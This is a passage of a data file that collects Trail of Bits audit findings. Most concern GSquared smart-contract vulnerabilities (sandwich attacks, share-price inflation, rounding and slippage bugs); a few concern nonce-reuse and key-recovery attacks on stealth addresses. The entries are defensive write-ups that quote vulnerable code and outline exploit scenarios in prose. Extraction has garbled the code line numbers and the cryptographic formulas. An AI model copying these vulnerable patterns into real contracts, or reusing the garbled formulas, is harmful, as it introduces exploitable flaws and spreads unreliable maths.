used, the loop will never nish without running out of gas. A similar issue aects StrategyQueue.withdrawalQueue , if called directly. Exploit Scenario Alice creates a smart contract that acts as the owner of a GVault. She includes code to reorder strategies using a call to moveStrategy . Since she wants to ensure that a certain strategy is always moved to the end of the queue, she uses a very large value as the position. When the code runs, it will always run out of gas, blocking the operation. Recommendations Short term, ensure the execution of the move ends in a number of steps that is bounded by the number of strategies in the queue. Long term, use unit tests and fuzzing tools like Echidna to test that the protocol works as expected, even for edge cases.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. GVault withdrawals from ConvexStrategy are vulnerable to sandwich attacks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "Token swaps that may be executed during vault withdrawals are vulnerable to sandwich attacks. Note that this is applicable only if a user withdraws directly from the GVault , not through the GRouter contract. The ConvexStrategy contract performs token swaps through Uniswap V2, Uniswap V3, and Curve. All platforms allow the caller to specify the minimum-amount-out value, which indicates the minimum amount of tokens that a user wishes to receive from a swap. This provides protection against illiquid pools and sandwich attacks. Many of the swaps that the ConvexStrategy contract performs have the minimum-amount-out value hardcoded to zero. But a majority of these swaps can be triggered only by a Gelato keeper, which uses a private channel to relay all transactions. Thus, these swaps cannot be sandwiched. However, this is not the case with the ConvexStrategy.withdraw function. The withdraw function will be called by the GVault contract if the GVault does not have enough tokens for a user withdrawal. If the balance is not sucient, ConvexStrategy.withdraw will be called to retrieve additional assets to complete the withdrawal request. Note that the transaction to withdraw assets from the protocol will be visible in the public mempool (gure 6.1). function withdraw ( uint256 _amount ) 771 772 773 774 { 775 776 777 778 779 780 781 782 783 784 785 external returns ( uint256 withdrawnAssets , uint256 loss ) if ( msg.sender != address (VAULT)) revert StrategyErrors.NotVault(); ( uint256 assets , uint256 balance , ) = _estimatedTotalAssets( false ); // not enough assets to withdraw if (_amount >= assets) { balance += sellAllRewards(); balance += divestAll( false ); if (_amount > balance) { loss = _amount - balance; withdrawnAssets = balance; } else { withdrawnAssets = _amount; 786 787 788 789 790 791 792 793 794 795 796 797 798 799 800 801 802 803 804 805 806 807 808 809 810 811 812 } } } else { // check if there is a loss, and distribute it proportionally // if it exists uint256 debt = VAULT.getStrategyDebt(); if (debt > assets) { loss = ((debt - assets) * _amount) / debt; _amount = _amount - loss; } if (_amount <= balance) { withdrawnAssets = _amount; } else { withdrawnAssets = divest(_amount - balance, false ) + balance; if (withdrawnAssets < _amount) { loss += _amount - withdrawnAssets; } else { if (loss > withdrawnAssets - _amount) { loss -= withdrawnAssets - _amount; } else { loss = 0 ; } } } } ASSET.transfer( msg.sender , withdrawnAssets); return (withdrawnAssets, loss); Figure 6.1: The withdraw function in ConvexStrategy.sol#L771-812 In the situation where the _amount that needs to be withdrawn is more than or equal to the total number of assets held by the contract, the withdraw function will call sellAllRewards and divestAll with _ slippage set to false (see the highlighted portion of gure 6.1). The sellAllRewards function, which will call _sellRewards , sells all the additional reward tokens provided by Convex, its balance of CRV, and its balance of CVX for WETH. All these swaps have a hardcoded value of zero for the minimum-amount-out. Similarly, if _ slippage is set to false when calling divestAll , the swap species a minimum-amount-out of zero. By specifying zero for all these token swaps, there is no guarantee that the protocol will receive any tokens back from the trade. For example, if one or more of these swaps get sandwiched during a call to withdraw , there is an increased risk of reporting a loss that will directly aect the amount the user is able to withdraw. Exploit Scenario Alice makes a call to withdraw to remove some of her funds from the protocol. Eve notices this call in the public transaction mempool. Knowing that the contract will have to sell some of its rewards, Eve identies a pure prot opportunity and sandwiches one or more of the swaps performed during the transaction. The strategy now has to report a loss, which results in Alice receiving less than she would have otherwise. Recommendations Short term, for _sellRewards , use the same minAmount calculation as in divestAll but replace debt with the contracts balance of a given reward token. This can be applied for all swaps performed in _sellRewards . For divestAll , set _slippage to true instead of false when it is called in withdraw . Long term, document all cases in which front-running may be possible and its implications for the codebase. Additionally, ensure that all users are aware of the risks of front-running and arbitrage when interacting with the GSquared system.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "7. Stop loss primer cannot be deactivated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The stop loss primer cannot be deactivated because the keeper contract uses the incorrect function to check whether or not the meta pool has become healthy again. The stop loss primer is activated if the meta pool that is being used for yield becomes unhealthy. A meta pool is unhealthy if the price of the 3CRV token deviates from the expected price for a set amount of time. The primer can also be deactivated if, after it has been activated, the price of the token stabilizes back to a healthy value. Deactivating the primer is a critical feature because if the pool becomes healthy again, there is no reason to divest all of the strategys funds, take potential losses, and start all over again. The GStrategyResolver contract, which is called by a Gelato keeper, will check to identify whether a primer can be deactivated. This is done via the taskStopStopLossPrimer function. The function will attempt to call the GStrategyGuard.endStopLoss function to see whether the primer can be deactivated (gure 7.1). function taskStopStopLossPrimer () external view returns ( bool canExec , bytes memory execPayload) IGStrategyGuard executor = IGStrategyGuard(stopLossExecutor); if (executor.endStopLoss()) { canExec = true ; execPayload = abi.encodeWithSelector( executor.stopStopLossPrimer.selector ); } 46 47 48 49 50 { 51 52 53 54 55 56 57 58 } Figure 7.1: The taskStopStopLossPrimer function in GStrategyResolver.sol#L46-58 However, the GStrategyGuard contract does not have an endStopLoss function. Instead, it has a canEndStopLoss function. Note that the executor variable in taskStopStopLossPrimer is expected to implement the IGStrategyGuard function, which does have an endStopLoss function. However, the GStrategyGuard contract implements the IGuard interface, which does not have the endStopLoss function. Thus, the call to endStopLoss will simply return, which is equivalent to returning false , and the primer will not be deactivated. Exploit Scenario Due to market conditions, the price of the 3CRV token drops signicantly for an extended period of time. This triggers the Gelato keeper to activate the stop loss primer. Soon after, the price of the 3CRV token restabilizes. However, because of the incorrect function call in the taskStopStopLossPrimer function, the primer cannot be deactivated, the stop loss process completes, and all the funds in the strategy must be divested. Recommendations Short term, change the function call from endStopLoss to canEndStopLoss in taskStopStopLossPrimer . Long term, ensure that there are no near-duplicate interfaces for a given contract in the protocol that may lead to an edge case similar to this. Additionally, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "8. getYieldTokenAmount uses convertToAssets instead of convertToShares ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The getYieldTokenAmount function does not properly convert a 3CRV token amount into a G3CRV token amount, which may allow a user to withdraw more or less than expected or lead to imbalanced tranches after a migration. The expected behavior of the getYieldTokenAmount function is to return the number of G3CRV tokens represented by a given 3CRV amount. For withdrawals, this will determine how many G3CRV tokens should be returned back to the GRouter contract. For migrations, the function is used to gure out how many G3CRV tokens should be allocated to the senior and junior tranches. To convert a given amount of 3CRV to G3CRV, the GVault.convertToShares function should be used. However, the getYieldTokenAmount function uses the GVault.convertToAssets function (gure 8.1). Thus, getYieldTokenAmount takes an amount of 3CRV tokens and treats it as shares in the GVault , instead of assets. 169 170 171 172 173 { 174 175 } function getYieldTokenAmount ( uint256 _index , uint256 _amount ) internal view returns ( uint256 ) return getYieldToken(_index).convertToAssets(_amount); Figure 8.1: The getYieldTokenAmount function in GTranche.sol#L169-175 If the system is protable, each G3CRV share should be worth more over time. Thus, getYieldTokenAmount will return a value larger than expected because one share is worth more than one asset. This allows a user to withdraw more from the GTranche contract than they should be able to. Additionally, a protable system will cause the senior tranche to receive more G3CRV tokens than expected during migrations. A similar situation can happen if the system is not protable. Exploit Scenario Alice deposits $100 worth of USDC into the system. After a certain amount of time, the GSquared protocol becomes protable and Alice should be able to withdraw $110, making $10 in prot. However, due to the incorrect arithmetic performed in the getYieldTokenAmount function, Alice is able to withdraw $120 of USDC. Recommendations Short term, use convertToShares instead of convertToAssets in getYieldTokenAmount . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "9. convertToShares can be manipulated to block deposits ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "An attacker can block operations by using direct token transfers to manipulate convertToShares , which computes the amount of shares to deposit. convertToShares is used in the GVault code to know how many shares correspond to certain amount of assets: 394 395 396 397 398 399 400 401 { 402 /// @notice Value of asset in shares /// @param _assets amount of asset to convert to shares function convertToShares ( uint256 _assets ) public view override returns ( uint256 shares ) uint256 freeFunds_ = _freeFunds(); // Saves an extra SLOAD if _freeFunds is non-zero. 403 404 } return freeFunds_ == 0 ? _assets : (_assets * totalSupply) / freeFunds_; Figure 9.1: The convertToShares function in GVault.sol This function relies on the _freeFunds function to calculate the amount of shares: 706 707 708 709 710 } /// @notice the number of total assets the GVault has excluding and profits /// and losses function _freeFunds () internal view returns ( uint256 ) { return _totalAssets() - _calculateLockedProfit(); Figure 9.2: The _freeFunds function in GVault.sol In the simplest case, _calculateLockedProfit() can be assumed as zero if there is no locked prot. The _totalAssets function is implemented as follows: 820 821 /// @notice Vault adapters total assets including loose assets and debts /// @dev note that this does not consider estimated gains/losses from the strategies 822 823 824 } function _totalAssets () private view returns ( uint256 ) { return asset.balanceOf( address ( this )) + vaultTotalDebt; Figure 9.3: The _totalAssets function in GVault.sol However, the fact that _totalAssets has a lower bound determined by asset.balanceOf(address(this)) can be exploited to manipulate the result by \"donating\" assets to the GVault address. Exploit Scenario Alice deploys a new GVault. Eve observes the deployment and quickly transfers an amount of tokens to the GVault address. One of two scenarios can happen: 1. 2. Eve transfers a minimal amount of tokens, forcing a positive amount of freeFunds . This will block any immediate calls to deposit, since it will result in zero shares to be minted. Eve transfers a large amount of tokens, forcing future deposits to be more expensive or resulting in zero shares. Every new deposit can increase the amount of free funds, making the eect more severe. It is important to note that although Alice cannot use the deposit function, she can still call mint to bypass the exploit. Recommendations Short term, use a state variable, assetBalance , to track the total balance of assets in the contract. Avoid using balanceOf , which is prone to manipulation. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "10. Harvest operation could be blocked if eligibility check on a strategy reverts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "During harvest, if any of the strategies in the queue were to revert, it would prevent the loop from reaching the end of the queue and also block the entire harvest operation. When the harvest function is executed, a loop iterates through each of the strategies in the strategies queue, and the canHarvest() check runs on each strategy to determine if it is eligible for harvesting; if it is, the harvest logic is executed on that strategy. 312 313 314 315 316 317 318 319 320 321 322 /// @notice Execute strategy harvest function harvest () external { if ( msg.sender != keeper) revert GuardErrors.NotKeeper(); uint256 strategiesLength = strategies.length; for ( uint256 i ; i < strategiesLength; i++) { address strategy = strategies[i]; if (strategy == address ( 0 )) continue ; if (IStrategy(strategy).canHarvest()) { if (strategyCheck[strategy].active) { IStrategy(strategy).runHarvest(); try IStrategy(strategy).runHarvest() {} catch Error( ... Figure 10.1: The harvest function in GStrategyGuard.sol However, if the canHarvest() check on a particular strategy within the loop reverts, external calls from the canHarvest() function to check the status of rewards could also revert. Since the call to canHarvest() is not inside of a try block, this would prevent the loop from proceeding to the next strategy in the queue (if there is one) and would block the entire harvest operation. Additionally, within the harvest function, the runHarvest function is called twice on a strategy on each iteration of the loop. This could lead to unnecessary waste of gas and possibly undened behavior. Recommendations Short term, wrap external calls within the loop in try and catch blocks, so that reverts can be handled gracefully without blocking the entire operation. Additionally, ensure that the canHarvest function of a strategy can never revert. Long term, carefully audit operations that consume a large amount of gas, especially those in loops. Additionally, when designing logic loops that make external calls, be mindful as to whether the calls can revert, and wrap them in try and catch blocks when necessary.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "11. Incorrect rounding direction in GVault ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The minting and withdrawal operations in the GVault use rounding in favor of the user instead of the protocol, giving away a small amount of shares or assets that can accumulate over time . convertToShares is used in the GVault code to know how many shares correspond to a certain amount of assets: 394 395 396 397 398 399 400 401 { 402 /// @notice Value of asset in shares /// @param _assets amount of asset to convert to shares function convertToShares ( uint256 _assets ) public view override returns ( uint256 shares ) uint256 freeFunds_ = _freeFunds(); // Saves an extra SLOAD if _freeFunds is non-zero. 403 404 } return freeFunds_ == 0 ? _assets : (_assets * totalSupply) / freeFunds_; Figure 11.1: The convertToShares function in GVault.sol This function rounds down, providing slightly fewer shares than expected for some amount of assets. Additionally, convertToAssets i s used in the GVault code to know how many assets correspond to certain amount of shares: 406 /// @notice Value of shares in underlying asset /// @param _shares amount of shares to convert to tokens function convertToAssets ( uint256 _shares ) 407 408 409 410 411 412 413 { public view override returns ( uint256 assets ) 414 uint256 _totalSupply = totalSupply; // Saves an extra SLOAD if _totalSupply is non-zero. 415 416 417 418 419 } return _totalSupply == 0 ? _shares : ((_shares * _freeFunds()) / _totalSupply); Figure 11.2: The convertToAssets function in GVault.sol This function also rounds down, providing slightly fewer assets than expected for some amount of shares. However, the mint function uses previewMint , which uses convertToAssets : 204 205 206 207 208 209 { 210 211 212 213 214 215 216 217 218 219 220 } function mint ( uint256 _shares , address _receiver ) external override nonReentrant returns ( uint256 assets ) // Check for rounding error in previewMint. if ((assets = previewMint(_shares)) == 0 ) revert Errors.ZeroAssets(); _mint(_receiver, _shares); asset.safeTransferFrom( msg.sender , address ( this ), assets); emit Deposit( msg.sender , _receiver, assets, _shares); return assets; Figure 12.3: The mint function in GVault.sol This means that the function favors the user, since they get some xed amount of shares for a rounded-down amount of assets. In a similar way, the withdraw function uses convertToShares : function withdraw ( uint256 _assets , address _receiver , address _owner 227 228 229 230 231 ) external override nonReentrant returns ( uint256 shares ) { 232 if (_assets == 0 ) revert Errors.ZeroAssets(); 233 234 235 236 shares = convertToShares(_assets); if (shares > balanceOf[_owner]) revert Errors.InsufficientShares(); 237 238 239 if ( msg.sender != _owner) { uint256 allowed = allowance[_owner][ msg.sender ]; // Saves gas for limited approvals. 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 } if (allowed != type( uint256 ).max) allowance[_owner][ msg.sender ] = allowed - shares; } _assets = beforeWithdraw(_assets, asset); _burn(_owner, shares); asset.safeTransfer(_receiver, _assets); emit Withdraw( msg.sender , _receiver, _owner, _assets, shares); return shares; Figure 11.4: The withdraw function in GVault.sol This means that the function favors the user, since they get some xed amount of assets for a rounded-down amount of shares. This issue should also be also considered when minting fees, since they should favor the protocol instead of the user or the strategy. Exploit Scenario Alice deploys a new GVault and provides some liquidity. Eve uses mints and withdrawals to slowly drain the liquidity, possibly aecting the internal bookkeeping of the GVault. Recommendations Short term, consider refactoring the GVault code to specify the rounding direction across the codebase in order keep the error in favor of the user or the protocol. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "12. Protocol migration is vulnerable to front-running and a loss of funds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The migration from Gro protocol to GSquared protocol can be front-run by manipulating the share price enough that the protocol loses a large amount of funds. The GMigration contract is responsible for initiating the migration from Gro to GSquared. The G Migration.prepareMigration function will deposit liquidity into the three-pool and then attempt to deposit the 3CRV LP token into the GVault contract in exchange for G3CRV shares (gure 12.1). Note that this migration occurs on a newly deployed GVault contract that holds no assets and has no supply of shares. 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 function prepareMigration ( uint256 minAmountThreeCRV ) external onlyOwner { if (!IsGTrancheSet) { revert Errors.TrancheNotSet(); } // read senior tranche value before migration seniorTrancheDollarAmount = SeniorTranche(PWRD).totalAssets(); uint256 DAI_BALANCE = ERC20(DAI).balanceOf( address ( this )); uint256 USDC_BALANCE = ERC20(USDC).balanceOf( address ( this )); uint256 USDT_BALANCE = ERC20(USDT).balanceOf( address ( this )); // approve three pool ERC20(DAI).safeApprove(THREE_POOL, DAI_BALANCE); ERC20(USDC).safeApprove(THREE_POOL, USDC_BALANCE); ERC20(USDT).safeApprove(THREE_POOL, USDT_BALANCE); // swap for 3crv IThreePool(THREE_POOL).add_liquidity( [DAI_BALANCE, USDC_BALANCE, USDT_BALANCE], minAmountThreeCRV ); //check 3crv amount received uint256 depositAmount = ERC20(THREE_POOL_TOKEN).balanceOf( address ( this ) ); // approve 3crv for GVault ERC20(THREE_POOL_TOKEN).safeApprove( address (gVault), depositAmount); // deposit into GVault uint256 shareAmount = gVault.deposit(depositAmount, address ( this )); // approve gVaultTokens for gTranche ERC20( address (gVault)).safeApprove( address (gTranche), shareAmount); 89 90 91 92 93 94 95 96 97 98 } } Figure 12.1: The prepareMigration function in GMigration.sol#L61-98 However, this prepareMigration function call is vulnerable to a share price ination attack. As noted in this issue , the end result of the attack is that the shares (G3CRV) that the GMigration contract will receive can redeem only a portion of the assets that were originally deposited by GMigration into the GVault contract. This occurs because the rst depositor in the GVault is capable of manipulating the share price signicantly, which is compounded by the fact that the deposit function in GVault rounds in favor of the protocol due to a division in convertToShares (see TOB-GRO-11 ). Exploit Scenario Alice, a GSquared developer, calls prepareMigration to begin the process of migrating funds from Gro to GSquared. Eve notices this transaction in the public mempool, and front-runs it with a small deposit and a large token (3CRV) airdrop. This leads to a signicant change in the share price. The prepareMigration call completes, but GMigration is left with a small, insucient amount of shares because it has suered from truncation in the convertToShares function. These shares can be redeemed for only a portion of the original deposit. Recommendations Short term, perform the GSquared system deployment and protocol migration using a private relay. This will mitigate the risk of front-running the migration or price share manipulation. Long term, implement the short- and long-term recommendations outlined in TOB-GRO-11 . Additionally, implement an ERC4626Router similar to Fei protocols implementation so that a minimum-amount-out can be specied for deposit, mint, redeem, and withdraw operations. References   ERC4626RouterBase.sol ERC4626 share price ination", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "13. Incorrect slippage calculation performed during strategy investments and divestitures ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The incorrect arithmetic calculation for slippage tolerance during strategy investments and divestitures can lead to an increased rate of failed prot-and-loss (PnL) reports and withdrawals. The ConvexStrategy contract is tasked with investing excess funds into a meta pool to obtain yield and divesting those funds from the pool whenever necessary. Investments are done via the invest function, and divestitures for a given amount are done via the divest function. Both functions have the ability to manage the amount of slippage that is allowed during the deposit and withdrawal from the meta pool. For example, in the divest function, the withdrawal will go through only if the amount of 3CRV tokens that will be transferred out from the pool (by burning meta pool tokens) is greater than or equal to the _debt , the amount of 3CRV that needs to be transferred out from the pool, discounted by baseSlippage (gure 13.1). Thus, both sides of the comparison must have units of 3CRV. 883 884 885 886 887 888 889 890 891 892 893 894 895 896 897 898 899 900 901 902 903 function divest ( uint256 _debt , bool _slippage ) internal returns ( uint256 ) { uint256 meta_amount = ICurveMeta(metaPool).calc_token_amount( [ 0 , _debt], false ); if (_slippage) { uint256 ratio = curveValue(); if ( (meta_amount * PERCENTAGE_DECIMAL_FACTOR) / ratio < ((_debt * (PERCENTAGE_DECIMAL_FACTOR - baseSlippage)) / PERCENTAGE_DECIMAL_FACTOR) revert StrategyErrors.LTMinAmountExpected(); ) { } } Rewards(rewardContract).withdrawAndUnwrap(meta_amount, false ); return ICurveMeta(metaPool).remove_liquidity_one_coin( meta_amount, CRV3_INDEX, 904 905 } ); Figure 13.1: The divest function in ConvexStrategy.sol#L883-905 To calculate the value of a meta pool token (mpLP) in terms of 3CRV, the curveValue function is called (gure 13.2). The units of the return value, ratio , are 3CRV/mpLP. 1170 1171 1172 1173 1174 } function curveValue () internal view returns ( uint256 ) { uint256 three_pool_vp = ICurve3Pool(CRV_3POOL).get_virtual_price(); uint256 meta_pool_vp = ICurve3Pool(metaPool).get_virtual_price(); return (meta_pool_vp * PERCENTAGE_DECIMAL_FACTOR) / three_pool_vp; Figure 13.2: The curveValue function in ConvexStrategy.sol#L1170-1174 However, note that in gure 13.1, meta_amount value, which is the amount of mpLP tokens that need to be burned, is divided by ratio . From a unit perspective, this is multiplying an mpLP amount by a mpLP/3CRV ratio. The resultant units are not 3CRV. Instead, the arithmetic should be meta_amount multiplied by ratio. This would be mpLP times 3CRV/mpLP, which would result in the nal units of 3CRV. Assuming 3CRV/mpLP is greater than one, the division instead of multiplication will result in a smaller value, which increases the likelihood that the slippage tolerance is not met. The invest and divest functions are called during PnL reporting and withdrawals. If there is a higher risk for the functions to revert because the slippage tolerance is not met, the likelihood of failed PnL reports and withdrawals also increases. Exploit Scenario Alice wishes to withdraw some funds from the GSquared protocol. She calls GRouter.withdraw and with a reasonable minAmount . The GVault contract calls the ConvexStrategy contract to withdraw some funds to meet the necessary withdrawal amount. The strategy attempts to divest the necessary amount of funds. However, due to the incorrect slippage arithmetic, the divest function reverts and Alices withdrawal is unsuccessful. Recommendations Short term, in divest , multiply meta_amount by ratio . In invest , multiply amount by ratio . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "14. Potential division by zero in _calcTrancheValue ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "Junior tranche withdrawals may fail due to an unexpected division by zero error. One of the key steps performed during junior tranche withdrawals is to identify the dollar value of the tranche tokens that will be burned by calling _calcTrancheValue (gure 14.1). function _calcTrancheValue ( bool _tranche , uint256 _amount , uint256 _total 559 560 561 562 563 ) public view returns ( uint256 ) { 564 565 566 567 568 } uint256 factor = getTrancheToken(_tranche).factor(_total); uint256 amount = (_amount * DEFAULT_FACTOR) / factor; if (amount > _total) return _total; return amount; Figure 14.1: The _calcTrancheValue function in GTranche.sol#L559-568 To calculate the dollar value, the factor function is called to identify how many tokens represent one dollar. The dollar value, amount , is then the token amount provided, _amount , divided by factor . However, an edge case in the factor function will occur if the total supply of tranche tokens (junior or senior) is non-zero while the amount of assets backing those tokens is zero. Practically, this can happen only if the system is exposed to a loss large enough that the assets backing the junior tranche tokens are completely wiped. In this edge case, the factor function returns zero (gure 14.2). The subsequent division by zero in _calcTrancheValue will cause the transaction to revert. 525 526 527 528 529 function factor ( uint256 _totalAssets ) public view override returns ( uint256 ) 530 { 531 532 533 534 535 536 537 538 539 if (totalSupplyBase() == 0 ) { return getInitialBase(); } if (_totalAssets > 0 ) { return totalSupplyBase().mul(BASE).div(_totalAssets); } // This case is totalSupply > 0 && totalAssets == 0, and only occurs on system loss 540 541 } return 0 ; Figure 14.2: The factor function in GToken.sol#L525-541 It is important to note that if the system enters a state where there are no assets backing the junior tranche, junior tranche token holders would be unable to withdraw anyway. However, this division by zero should be caught in _calcTrancheValue , and the requisite error code should be thrown. Recommendations Short term, add a check before the division to ensure that factor is greater than zero. If factor is zero, throw a custom error code specically created for this situation. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "15. Token withdrawals from GTranche are sent to the incorrect address ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The GTranche withdrawal function takes in a _recipient address to send the G3CRV shares to, but instead sends those shares to msg.sender (gure 15.1). 212 213 214 215 216 217 ) 218 219 220 221 { function withdraw ( uint256 _amount , uint256 _index , bool _tranche , address _recipient external override returns ( uint256 yieldTokenAmounts , uint256 calcAmount ) trancheToken.burn( msg.sender , factor, calcAmount); token.transfer( msg.sender , yieldTokenAmounts); . [...] . 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 } emit LogNewWithdrawal( msg.sender , _recipient, _amount, _index, _tranche, yieldTokenAmounts, calcAmount ); return (yieldTokenAmounts, calcAmount); Figure 15.1: The withdraw function in GTranche.sol#L219-259 Since GTranche withdrawals are performed by the GRouter contract on behalf of the user, the msg.sender and _recipient address are the same. However, a direct call to GTranche.withdraw by a user could lead to unexpected consequences. Recommendations Short term, change the destination address to _recipient instead of msg.sender . Long term, increase unit test coverage to include tests directly on GTranche and associated contracts in addition to performing the unit tests through the GRouter contract.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "16. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The GSquared Protocol contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. Security issues due to optimization bugs have occurred in the past . A medium- to high-severity bug in the Yul optimizer was introduced in Solidity version 0.8.13 and was xed only recently, in Solidity version 0.8.17 . Another medium-severity optimization bugone that caused memory writes in inline assembly blocks to be removed under certain conditions  was patched in Solidity 0.8.15. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the GSquared Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Related-nonce attacks across keys allow root key recovery ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf", "body": "Given multiple addresses generated by the same sender, if any two signatures with the associated private keys use the same nonce, then the recipients private root key can be recovered. Nonce reuse attacks are a known risk for single ECDSA keys, but this attack extends the vulnerability to all keys generated by a given sender. Exploit Scenario Alice uses Bobs public key to generate addresses  1 =  (  ||1 ) *  +   and  =  (  ||2 ) *  +  and deposits funds in each. Bobs corresponding private  2 keys will be   1 does not know  ||1 ) +  =  (    2   , she does know the dierence of the two: 2 =  (  ||2 ) +  and    1 or . Note that, while Alice   =  2   1 =  (  ||2 )   (  ||1 )  . As a result, she can write  2 =  1 +  .   Suppose Bob signs messages with hashes (respectively), and he uses the same nonce  2 and to transfer the funds out of   1 2  in both signatures. He will output signatures  1  1 and  1 ) (  ,  1 and ) (  ,  2 , where  = (  *  ) ,   1 =  (  1 ) +   1 , and =   2 (  2 +   1 +   )  .  Subtracting the -values gives us  1 except  are known, Alice can recover  1   2  =  (  1  , and thus 1   2  , and 2    )    . Because all the terms =  2   (  ||2 ) .  Recommendations Consider using deterministic nonce generation in any stealth-enabled wallets. This is an approach used in multiple elliptic curve digital signature schemes, and can be adapted to ECDSA relatively easily; see RFC 6979 . Also consider root key blinding. Set   =  (  ||  ) *  +  (  ||  ||\"  \" ) *    With blinding, private keys take the form   =  (  ||  ) +    (  ||  ||\"  \" )   Since the   terms no longer cancel out, Alice cannot nd , and the attack falls apart.    .  . Finally, consider using homogeneous key derivation. Set private key for Bob is then   =  (  ||  )   +       =  (  ||  ) *  +   . Because Alice does not know   . The  ,  she cannot nd  , and the attack falls apart.  References   ECDSA: Handle with Care RFC 6979: Deterministic Usage of the Digital Signature Algorithm (DSA) and Elliptic Curve Digital Signature Algorithm (ECDSA)", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Undetermined"]}, {"title": "2. Limited forgeries for related keys ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf", "body": "If Bob signs a message for an address generated by Alice, Alice can convert it into a valid signature for another address. She cannot, however, control the hash of the message being signed, so this attack is of limited value. As with the related-nonce attack, this attack relies on Alice knowing the dierence in discrete logarithms between two addresses. Exploit Scenario Alice generates addresses  1 =  (  ||1 ) *  +   and  2  =  (  ||2 ) *  +    and deposits funds in each account. As before, Alice knows discrete logs for  1 and  , and 2   =  2   . 1   , the dierence of the Bob transfers money out of  , generating signature 2  *  -coordinate of (where  where  is the  (  ,  ) of a message   with hash , is the nonce). The signature is validated by computing  =    1 *  +    1 *  2 and verifying that the  -coordinate of   matches . Alice can convert this into a signature under for a message with hash  ' =  +   .  Verifying this signature under  , computing 1  1  becomes:  = (  +    1 )  *  +    1 *  1   1 =   *  +    1   1  *  +   1 *    1 =   *  +    1 (  1 +   ) *   1 =   *  +    1 *  2 This is the same relation that makes will be correct. (  ,  ) a valid signature on a message with hash , so   Note that Alice has no control over the value of  ' would have to nd a preimage preimages is, to date, a hard problem for SHA-256 and related functions. under the given hash function. Computing , so to make an eective exploit, she  ' of  ' Recommendations Consider root key blinding, as above. The attack relies on Alice knowing blinding prevents her from learning it.   , and root key Consider homogeneous key derivation, as above. Once again, depriving Alice of   obviates the attack completely.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "3. Mutual transactions can be completely deanonymized ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf", "body": "When Alice and Bob both make stealth payments to each other, they generate the same Shared Secret #i for transaction i, which is used to derive destination keys for Bob and Alice: Symbol", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "4. Allowing invalid public keys may enable DH private key recovery ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf", "body": "Consider the following three assumptions: 1. 2. 3. Alice can add points that are not on the elliptic curve to the public key database, Bob does not verify the public key points, and Bob's scalar multiplication implementation has some specic characteristics. Assumptions 1 and 2 are currently not specied in the specication, which motivates this nding. If these assumptions hold, then Alice can recover Bob's DH key using a complicated attack, based on the CRYPTO 2000 paper by Biehl et al. and the DCC 2005 paper by Ciet et al . What follows is a rough sketch of the attack. For more details, see the reference publications, which also detail the specic characteristics for Assumption 3. Exploit Scenario Alice roughly 